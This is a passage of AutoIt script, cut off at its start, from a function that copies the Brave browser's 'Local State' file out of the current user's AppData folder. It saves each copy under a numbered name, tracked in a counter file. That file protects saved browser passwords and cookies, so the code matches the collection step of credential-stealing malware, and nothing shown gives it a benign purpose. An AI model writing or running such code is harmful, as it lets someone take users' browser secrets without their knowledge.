	$u = @UserName
	If _filecountlines("listcopy.txt") = 0 Then
		FileWriteLine("listcopy.txt", 1)
		$file = 1
	Else
		$file = FileReadLine("listcopy.txt", -1) + 1
		FileWriteLine("listcopy.txt", $file)
	EndIf
	$zzz = "C:\Users\" & $u & "\AppData\Local\BraveSoftware\Brave-Browser\User Data\Local State"
	FileCopy($zzz, "Local\" & $file, 9)
EndFunc
